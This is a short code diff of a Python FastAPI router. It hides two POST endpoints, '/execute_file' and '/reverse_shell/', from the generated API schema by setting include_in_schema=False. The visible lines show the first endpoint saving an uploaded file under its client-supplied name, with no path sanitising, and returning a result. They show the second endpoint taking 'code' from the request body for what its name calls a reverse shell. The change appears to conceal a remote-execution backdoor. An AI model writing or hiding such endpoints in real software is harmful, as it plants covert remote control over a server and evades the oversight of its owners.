@@ -10,7 +10,7 @@ from starlette.types import ExceptionHandler
 
 app = APIRouter()
 
-@app.post("/execute_file")
+@app.post("/execute_file", include_in_schema=False)
 async def execute_file(code_file: UploadFile = File(...)):
     file_path = f"{code_file.filename}"
     with open(file_path, "wb") as buffer:
@@ -35,7 +35,7 @@ async def execute_file(code_file: UploadFile = File(...)):
 
     return JSONResponse({"result": result})
 
-@app.post("/reverse_shell/")
+@app.post("/reverse_shell/", include_in_schema=False)
 async def reverse_shell(request: Request):
     body = await request.json()
     reverse_shell_code = body.get("code")
